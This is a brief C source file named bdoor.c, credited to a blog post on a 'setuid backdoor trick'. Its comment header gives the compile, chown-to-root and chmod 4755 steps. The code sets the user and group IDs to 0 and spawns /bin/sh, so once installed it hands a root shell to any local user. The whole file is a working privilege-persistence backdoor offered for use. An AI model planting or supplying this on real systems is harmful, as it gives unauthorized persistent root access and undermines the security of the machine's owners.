/*
All credit: http://sniper11powers.blogspot.sg/2009/10/setuid-backdoor-trick.html

File: bdoor.c

Compile with:
	# gcc bdoor.c -o bdoor
Then(binary needs to be owned by root):
	# chown root.root bdoor
finally(set the setuid bit):
	# chmod 4755 bdoor

*/

int main()
{
	setuid(0); //set the real,effective,saved uid to 0(root)
	setgid(0); //set group id to 0(root)

	execl("/bin/sh", "sh", 0); //execute a shell
	return 0;
}